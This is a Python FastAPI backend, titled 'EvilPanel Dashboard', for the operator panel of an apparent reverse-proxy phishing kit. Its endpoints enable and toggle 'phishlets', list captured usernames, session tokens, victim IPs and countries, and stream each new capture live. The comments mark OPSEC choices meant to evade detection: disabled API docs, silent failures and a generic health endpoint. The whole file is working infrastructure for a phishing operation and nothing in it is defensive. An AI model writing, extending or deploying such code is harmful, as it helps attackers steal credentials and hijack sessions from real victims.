"""
EvilPanel Dashboard FastAPI Backend
Source: plan-aligned-implementation-protocol.md Lines 808-930
OPSEC: Docs disabled, silent failure, IP hashing
"""

import asyncio
from typing import List, Optional
from datetime import datetime

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# OPSEC: No docs endpoints in production
app = FastAPI(
    title="Panel API",
    docs_url=None,  # Disabled for OPSEC
    redoc_url=None,  # Disabled for OPSEC
    openapi_url=None  # Disabled for OPSEC
)

# CORS configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Restrict in production
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# Request/Response Models
class StatsResponse(BaseModel):
    """Dashboard statistics"""
    phishlet_count: int
    active_phishlets: int
    total_captures: int
    unique_victims: int
    traffic_24h: int
    blocked_ips: int


class LogEntry(BaseModel):
    """Captured credential log entry"""
    id: str
    phishlet: str
    username: Optional[str]
    timestamp: str
    victim_ip: str
    has_tokens: bool
    location_country: Optional[str]


class PhishletInfo(BaseModel):
    """Phishlet information"""
    name: str
    is_enabled: bool
    subdomain: str
    session_count: int


class TrafficInfo(BaseModel):
    """Traffic statistics"""
    total_connections: int
    blocked_requests: int
    top_sources: List[dict]


class BlacklistRequest(BaseModel):
    """Blacklist add request"""
    ip: str
    reason: str = ""
    expires_hours: Optional[int] = None


class ProxyConfigResponse(BaseModel):
    """Proxy configuration"""
    domain: str
    port: int
    ssl_enabled: bool
    mode: str


# WebSocket connection manager
class ConnectionManager:
    """Manage WebSocket connections for real-time updates"""
    
    def __init__(self):
        self.active_connections: List[WebSocket] = []
    
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
    
    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)
    
    async def broadcast(self, message: dict):
        """Broadcast message to all connected clients"""
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                pass  # Silent failure


manager = ConnectionManager()


# API Endpoints

@app.get("/api/dashboard/stats", response_model=StatsResponse)
async def get_dashboard_stats():
    """
    Get dashboard statistics
    Source: plan.md Task 3.1
    """
    try:
        from ...database.models import Database
        from ...core.proxy import get_proxy_instance
        
        db = Database()
        proxy = get_proxy_instance()
        
        # Get stats
        session_count = db.get_session_count()
        phishlets = db.get_all_phishlets()
        enabled_phishlets = [p for p in phishlets if p.get('is_enabled')]
        blocked = db.get_blocked_ips()
        traffic_stats = db.get_traffic_stats(hours=24)
        
        return StatsResponse(
            phishlet_count=len(phishlets),
            active_phishlets=len(enabled_phishlets),
            total_captures=session_count,
            unique_victims=session_count,  # Approximation
            traffic_24h=traffic_stats.get('total_requests', 0),
            blocked_ips=len(blocked)
        )
    except Exception:
        # Return empty stats on failure
        return StatsResponse(
            phishlet_count=0,
            active_phishlets=0,
            total_captures=0,
            unique_victims=0,
            traffic_24h=0,
            blocked_ips=0
        )


@app.get("/api/logs", response_model=List[LogEntry])
async def get_credential_logs(limit: int = 50, offset: int = 0):
    """
    Get captured credential logs
    Source: plan.md Task 3.1
    """
    try:
        from ...database.models import Database
        
        db = Database()
        sessions = db.get_recent_sessions(limit=limit, offset=offset)
        
        logs = []
        for session in sessions:
            logs.append(LogEntry(
                id=session.id,
                phishlet=session.phishlet,
                username=session.username,
                timestamp=session.timestamp,
                victim_ip=session.victim_ip,
                has_tokens=bool(session.tokens),
                location_country=session.location.get('country')
            ))
        
        return logs
    except Exception:
        return []


@app.get("/api/phishlets", response_model=List[PhishletInfo])
async def get_phishlets():
    """
    Get all phishlets
    Source: plan.md Task 3.1
    """
    try:
        from ...database.models import Database
        
        db = Database()
        phishlets = db.get_all_phishlets()
        
        result = []
        for p in phishlets:
            sessions = db.get_sessions_by_phishlet(p['name'])
            result.append(PhishletInfo(
                name=p['name'],
                is_enabled=p.get('is_enabled', False),
                subdomain=p.get('subdomain', ''),
                session_count=len(sessions) if sessions else 0
            ))
        
        return result
    except Exception:
        return []


@app.post("/api/phishlets/{name}/toggle")
async def toggle_phishlet(name: str):
    """
    Toggle phishlet enabled state
    Source: plan.md Task 3.1
    """
    try:
        from ...database.models import Database
        from ...core.proxy import get_proxy_instance
        
        db = Database()
        phishlet = db.get_phishlet(name)
        
        if not phishlet:
            raise HTTPException(status_code=404, detail="Phishlet not found")
        
        new_state = not phishlet.get('is_enabled', False)
        db.set_phishlet_enabled(name, new_state)
        
        # Update proxy instance
        proxy = get_proxy_instance()
        if proxy:
            if new_state:
                proxy.enable_phishlet(name)
            else:
                proxy.disable_phishlet(name)
        
        return {"name": name, "is_enabled": new_state}
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=500, detail="Internal error")


@app.get("/api/traffic", response_model=TrafficInfo)
async def get_traffic():
    """
    Get traffic statistics
    Source: plan.md Task 3.1
    """
    try:
        from ...database.models import Database
        
        db = Database()
        stats = db.get_traffic_stats(hours=24)
        
        return TrafficInfo(
            total_connections=stats.get('total_requests', 0),
            blocked_requests=stats.get('blocked_requests', 0),
            top_sources=[]  # Would need additional implementation
        )
    except Exception:
        return TrafficInfo(
            total_connections=0,
            blocked_requests=0,
            top_sources=[]
        )


@app.post("/api/blacklist/add")
async def add_to_blacklist(request: BlacklistRequest):
    """
    Add IP to blacklist
    Source: plan.md Task 3.1
    """
    try:
        from ...database.models import Database
        
        db = Database()
        success = db.add_blocked_ip(
            ip=request.ip,
            reason=request.reason,
            expires_hours=request.expires_hours
        )
        
        if not success:
            raise HTTPException(status_code=500, detail="Failed to add IP")
        
        return {"success": True, "ip": request.ip}
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=500, detail="Internal error")


@app.delete("/api/blacklist/{ip}")
async def remove_from_blacklist(ip: str):
    """Remove IP from blacklist"""
    try:
        from ...database.models import Database
        
        db = Database()
        success = db.remove_blocked_ip(ip)
        
        return {"success": success, "ip": ip}
    except Exception:
        raise HTTPException(status_code=500, detail="Internal error")


@app.get("/api/blacklist")
async def get_blacklist():
    """Get all blocked IPs"""
    try:
        from ...database.models import Database
        
        db = Database()
        blocked = db.get_blocked_ips()
        
        return {"blocked_ips": blocked}
    except Exception:
        return {"blocked_ips": []}


@app.get("/api/proxy/config", response_model=ProxyConfigResponse)
async def get_proxy_config():
    """
    Get proxy configuration
    Source: plan.md Task 3.1
    """
    try:
        from ...core.proxy import get_proxy_instance
        
        proxy = get_proxy_instance()
        
        if not proxy:
            return ProxyConfigResponse(
                domain="",
                port=443,
                ssl_enabled=True,
                mode="mitmproxy"
            )
        
        return ProxyConfigResponse(
            domain=proxy.domain,
            port=proxy.port,
            ssl_enabled=proxy.ssl_enabled,
            mode="mitmproxy"
        )
    except Exception:
        return ProxyConfigResponse(
            domain="",
            port=443,
            ssl_enabled=True,
            mode="mitmproxy"
        )


@app.get("/api/session/{session_id}")
async def get_session_details(session_id: str):
    """Get full session details"""
    try:
        from ...database.models import Database
        
        db = Database()
        session = db.get_session(session_id)
        
        if not session:
            raise HTTPException(status_code=404, detail="Session not found")
        
        return session.to_dict()
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=500, detail="Internal error")


# WebSocket endpoint for real-time updates
@app.websocket("/ws/logs")
async def websocket_logs(websocket: WebSocket):
    """
    WebSocket endpoint for real-time log streaming
    Source: plan.md Task 3.1
    """
    await manager.connect(websocket)
    
    try:
        while True:
            # Keep connection alive and listen for messages
            data = await websocket.receive_text()
            
            # Echo back for ping/pong
            if data == "ping":
                await websocket.send_text("pong")
                
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)


# Broadcast function for use by capture system
async def broadcast_new_capture(session_data: dict):
    """Broadcast new capture to all connected WebSocket clients"""
    await manager.broadcast({
        "type": "new_capture",
        "data": session_data,
        "timestamp": datetime.utcnow().isoformat()
    })


# Health check endpoint (OPSEC: generic name)
@app.get("/api/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "ok"}


# Startup event
@app.on_event("startup")
async def startup_event():
    """Initialize on startup"""
    try:
        from ...database.models import Database
        # Initialize database
        Database()
    except Exception:
        pass  # Silent failure


# Shutdown event
@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on shutdown"""
    # Close all WebSocket connections
    for connection in manager.active_connections:
        try:
            await connection.close()
        except Exception:
            pass

